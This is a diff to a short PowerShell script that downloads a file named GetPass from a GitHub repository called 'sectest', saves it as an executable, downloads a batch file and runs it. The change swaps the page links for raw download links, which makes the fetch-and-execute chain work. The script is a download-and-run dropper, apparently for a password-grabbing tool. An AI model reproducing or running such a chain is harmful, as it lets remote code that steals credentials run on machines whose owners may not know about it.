@@ -1,7 +1,7 @@
-(new-object System.Net.WebClient).DownloadFile('https://github.com/foryou123/sectest/blob/master/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/foryou123/sectest/master/gp.txt','D:\Get.exe');
 
 
-(new-object System.Net.WebClient).DownloadFile('https://github.com/foryou123/sectest/blob/master/Command.rar','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/foryou123/sectest/master/Command.rar','D:\Command.bat');
 
 
 D:\Command.bat;
